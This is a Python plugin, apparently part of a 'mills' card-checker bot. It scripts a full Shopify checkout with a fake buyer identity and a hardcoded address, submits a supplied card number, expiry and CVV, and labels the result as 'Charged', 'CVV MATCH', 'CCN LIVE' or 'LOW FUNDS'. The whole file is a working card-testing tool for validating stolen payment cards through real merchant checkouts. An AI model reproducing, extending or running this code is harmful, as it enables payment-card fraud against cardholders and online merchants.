import time
from urllib.parse import urlparse
from mills.plugins._helpers.tools import find_between
import requests



def get_response_sho(text):
    if 'Thank you' in text or 'Thank You For Your Order' in text or 'Your order is confirmed' in text:
        r_text, r_logo, r_respo = "Charged $34", "✅", 'CVV MATCH'
        return r_text, r_logo, r_respo,
    text1 = find_between(text, '<p class="notice__text">','</p></div></div>')
    text = text1 if text1 else text
    if 'ZIP code does not match billing address' in text or "2059" in text or "2060" in text :
        r_text, r_logo, r_respo = "ZIP INCORRECT", "✅", 'CVV MATCH'
    elif "2001"  in text or 'card has insufficient funds' in text:
        r_text, r_logo, r_respo = "LOW FUNDS", "✅", 'CVV MATCH'
    elif "Security code was not matched by the processor" in text or "card's security code is incorrect" in text:
        r_text, r_logo, r_respo = "CCN LIVE", "✅", 'CCN Match'
    # elif '"seller_message": "Payment complete."' in text or '"cvc_check": "pass"' in text or 'thank_you' in text or '"type":"one-time"' in text or '"state": "succeeded"' in text or "Your payment has already been processed" in text or '"status": "succeeded"' in text or 'Thank' in text:
    #     r_text, r_logo, r_respo = "Charged $34", "✅", 'Charged'
    else:
        r_text, r_logo, r_respo = "DECLINED", "❌", 'Rejected'
    r_text1 = text1.replace('-','') if text1 else r_text
    return r_text1,r_logo,r_respo


def get_c_url(r,product_link):
    a= r.get(product_link)

    varient_id = find_between(a.text, 'variantId":',',')
    
    if not a or not varient_id: return

    b_data = {
'form_type': 'product',
'utf8': '✓',
'id': varient_id,
'quantity': '1',
}
    webname = urlparse(product_link).netloc
    b = r.post(f'https://{webname}/cart/add', headers = {'x-requested-with': 'XMLHttpRequest'},data =b_data)


    if not b: return

    d_data = {
'updates[]': '1',
'checkout': '',
}

    d = r.post(f'https://{webname}/cart', headers = {'x-requested-with': 'XMLHttpRequest'},data = d_data)

    auth_token = find_between(d.text, 'type="hidden" name="authenticity_token" value="','"')

    if not d or not auth_token: return

    checkout_url = d.url
    return auth_token,checkout_url, webname



def charge(cc, mes, ano, cvv, r, rand_user, auth_token, checkout_url, webname):
    dic = {
'_method': 'patch',
'authenticity_token': auth_token,
'previous_step': 'contact_information',
'step': 'payment_method',
'checkout[email]': rand_user.get_email,
'checkout[buyer_accepts_marketing]': '0',
'checkout[pick_up_in_store][selected]': 'false',
'checkout[id]': 'delivery-shipping',
'checkout[shipping_address][first_name]': rand_user.first_name,
'checkout[shipping_address][last_name]': rand_user.last_name,
'checkout[shipping_address][address1]':'51 Wollombi Street',
'checkout[shipping_address][address2]': '',
'checkout[shipping_address][city]': 'Hambledon Hill',
'checkout[shipping_address][country]': 'Australia',
'checkout[shipping_address][province]': 'NSW',
'checkout[shipping_address][zip]': '2330',
'checkout[shipping_address][phone]': '',
'checkout[buyer_accepts_sms]': '0',
'checkout[sms_marketing_phone]': '',
'checkout[client_details][browser_width]': '674',
'checkout[client_details][browser_height]': '662',
'checkout[client_details][javascript_enabled]': '1',
'checkout[client_details][color_depth]': '24',
'checkout[client_details][java_enabled]': 'false',
'checkout[client_details][browser_tz]': '-330',
}


    e = r.post(checkout_url, data = dic)

    if not e: return

    dic = {
'_method': 'patch',
'authenticity_token': auth_token,
'previous_step': 'shipping_method',
'step': 'payment_method',
'checkout[shipping_rate][id]': 'Australia Post Shipping-3D55-10.36',
'checkout[client_details][browser_width]': '811',
'checkout[client_details][browser_height]': '627',
'checkout[client_details][javascript_enabled]': '1',
'checkout[client_details][color_depth]': '24',
'checkout[client_details][java_enabled]': 'false',
'checkout[client_details][browser_tz]': '-330',
}

    f = r.post(checkout_url, data = dic)
    # price  = find_between(e.text,'input type="hidden" name="checkout[total_price]" id="checkout_total_price" value="','"')
    if not f: return

    payment_gateway = find_between(f.text,'data-subfields-for-gateway="','"')

    json_four = {
    "credit_card": {
        "number": cc,
        "name": rand_user.first_name,
        "month": mes,
        "year": ano,
        "verification_value": cvv
    },
    "payment_session_scope": webname
}

    four = r.post('https://deposit.us.shopifycs.com/sessions', json = json_four)

    if 'id' not in four.json(): return


    dic = {
'_method': 'patch',
'authenticity_token': auth_token,
'previous_step': 'payment_method',
'step': '',
's': four.json()['id'],
'checkout[payment_gateway]': payment_gateway,
'checkout[credit_card][vault]': 'false',
'checkout[different_billing_address]': 'false',
'checkout[total_price]': 3406  ,
'complete': '1',
'checkout[client_details][browser_width]': '796',
'checkout[client_details][browser_height]': '627',
'checkout[client_details][javascript_enabled]': '1',
'checkout[client_details][color_depth]': '24',
'checkout[client_details][java_enabled]': 'false',
'checkout[client_details][browser_tz]': '-330',
}


    f = r.post(checkout_url, data = dic)

    if not f or 'processing' not in f.url: return
    time.sleep(4)

    g = r.get(checkout_url + '/processing?from_processing_page=1')

    time.sleep(5)
    # with open('m.txt', 'w') as w: w.write(g.text)
    if not g or 'from_processing_page=1&validate=true' not in g.url: return
    return g.text
    # text1 = find_between(g.text, '<p class="notice__text">','</p></div></div>')
